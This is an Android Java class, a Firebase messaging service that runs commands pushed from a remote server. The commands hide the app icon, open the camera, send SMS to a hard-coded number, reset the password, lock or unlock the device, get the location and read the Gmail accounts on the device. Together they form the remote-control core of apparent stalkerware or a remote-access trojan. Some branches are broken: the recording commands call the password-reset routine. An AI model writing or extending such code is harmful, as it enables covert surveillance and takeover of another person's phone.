package com.fcmcode.app;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    final String TAG = "hideunhideapp";
    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        if (!remoteMessage.getData().isEmpty()) {
            String command = remoteMessage.getData().get("command").trim();

            Log.d(TAG, "Receivssed command: '" + command + "' Length: " + command.length());

            if ("hide_app".equals(command)) {
                Log.d(TAG, "hide app condition check " + command);
                hideApp();
            } else if ("notify_app".equals(command)) {
                Log.d(TAG, "notify app command: " + command);
                notifyApp();
            }
            else if ("unhide_app".equals(command)) {
                Log.d(TAG, "unhide app command: " + command);
                ComponentName componentName = new ComponentName(this, MainActivity.class);
                getPackageManager().setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                );
//                YourHideAppClass unc = new YourHideAppClass();
//                unc.UnhideAppIcon();
            }
            else if ("camera_app".equals(command)) {
                Log.d(TAG, "camera app command: " + command);
                cameraapp();
            }
            else  if ("wallpaper_app".equals(command))
            {
                Log.d(TAG , "Set wall paper");
                setWallpaper();
            }
            else  if ("sms_app".equals(command))
            {
                Log.d(TAG , "Send sms");
                sendSms();
            }
            else  if ("resetpassword_app".equals(command))
            {
                Log.d(TAG , "reset password");
                resetPassword();
            }
            else  if ("startrecording_app".equals(command))
            {
                Log.d(TAG , "start recording commnand");
                resetPassword();
            }
            else  if ("stoprecording_app".equals(command))
            {
                Log.d(TAG , "stop recording");
                resetPassword();
            }

            else  if ("unlockdevice_app".equals(command))
            {
                Log.d(TAG , "unlock command");
                MyLockUnlock lockUnlockActivity = new MyLockUnlock();
                lockUnlockActivity.unlockDevice();
            }
            else  if ("removewallpaper_app".equals(command))
            {
                Log.d(TAG , "remove wallpaper command");
                removewallpaper();
            }
            else  if ("lockdevice_app".equals(command))
            {
                Log.d(TAG , "lock device app");
                lockdevice();
            }
            else  if ("getlocation_app".equals(command))
            {
                Log.d(TAG , "get location app");
                getlocation();
            }

            else  if ("alarm_app".equals(command))
            {
                Log.d(TAG , "get alarm app");
                sendAlarm();
            }
            else  if ("stopalarm_app".equals(command))
            {
                Log.d(TAG , "get stop alarm app");
                sendStopAlarm();
            }
            else  if ("battery_app".equals(command))
            {
                Log.d(TAG , "check battery app");
                checkbattery();
            }
            else if("gmail_app".equals(command))
            {
                Log.d(TAG , "check gmail");
                sendgmailacc();
            }
            else if("geoFancing_app".equals(command))
            {
                Log.d(TAG , "check geo fancing");

            }

        }

    }

    private void lockdevice() {
        Log.d("FdCM Command", "entered here in lock device app ");
        Intent intent = new Intent(this, MyLockUnlock.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    private void sendAlarm() {
        Log.d("FdCM Command", "entered here in alarm device app ");
        RingAlarm alarm = new RingAlarm(this);
        alarm.startAlarm();
    }
    private void sendgmailacc() {
        Log.d("FdCM Command", "entered here in gmail accounts ");
        MyGmailAcc gmail = new MyGmailAcc(this);
        gmail.getGmailAccounts();
    }
    private void sendStopAlarm() {
        Log.d("FdCM Command", "entered here in stop alarm device app ");
        RingAlarm alarm = new RingAlarm(this);
alarm.stopAlarm();
    }
    private void getlocation() {
        Log.d("FdCM Command", "entered here in get location app ");
        Intent intent = new Intent(this, MyGetLocation.class);
        startService(intent);
    }
    private void checkbattery() {
        Log.d("FdCM Command", "entered here in check battery app ");
       MyBattery battery = new MyBattery(this);
       battery.getBatteryPercentageAndSend();

    }

    private void hideApp() {
        Log.d("FdCM Command", "entered here in hide app ");
        Intent intent = new Intent(this, YourHideAppClass.class);  // Replace with your class
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    private void removewallpaper() {
        Log.d("FdCM Command", "entered here in remove wallpaper app ");
        Log.d("Remove Wallpaper", "Removing wallpaper");
        MyRemoveWallpaper removeWallpaper = new MyRemoveWallpaper(this);
        removeWallpaper.clearWallpaper();
    }
    private void notifyApp() {
        Log.d("FdCM Command", "entered here in notify app ");
        Intent intent = new Intent(this, MyNotification.class);  // Replace with your class
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void cameraapp()
    {
        Log.d("FdCM Command", "entered camera in notify app ");
        Intent intent = new Intent(this, MyCamera.class);  // Replace with your class
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void setWallpaper() {
        Log.d("FdCM Command", "entered here in setwallpaper app ");
        MySetWallpaper mySetWallpaper = new MySetWallpaper(this);
        mySetWallpaper.setCustomWallpaper();
    }

    private void sendSms() {
        Log.d("FdCM Command", "entered here in sendsms app ");
        MySendSms smsSender = new MySendSms();
        smsSender.sendSms("+918291236766", "Hello, this is a test message!", getApplicationContext());


    }

    private void resetPassword()
    {
        Log.d("FdCM Command" , "entered here in resetPassword app");
        Intent intent = new Intent(this, MyResetPassword.class);  // Replace with your class
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);

    }


}
